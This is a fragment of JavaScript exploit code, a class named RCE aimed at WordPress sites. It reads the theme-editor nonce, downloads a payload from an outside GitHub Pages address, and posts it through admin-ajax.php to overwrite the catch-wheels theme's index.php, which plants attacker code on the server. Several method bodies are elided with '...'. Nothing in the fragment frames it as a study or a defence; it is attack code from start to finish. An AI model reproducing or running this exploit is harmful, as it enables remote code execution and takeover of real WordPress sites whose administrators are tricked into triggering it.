class RCE {
	...
	theme_update(file, csrf){
		...
		jQuery.ajax({
			type: "POST",
			url: "/v3/wp-admin/admin-ajax.php?_fs_blog_admin=true",
			data: {newcontent : file, _wp_http_referer: '/v3/wp-admin/theme-editor.php?file=index.php&theme=catch-wheels', nonce: csrf, action: 'edit-theme-plugin-file',file: 'index.php',theme: 'catch-wheels', 'docs-list':''},
			success: function(){
	...
	boom_p1(csrf){
		...
		var that = this;
		var payload = that.get_req('https://gandhi3.github.io/wordpress_rce.txt');
	...
	get_nonce(){
		...
		var that = this;
		var url = '/v3/wp-admin/theme-editor.php?file=index.php&theme=catch-wheels';
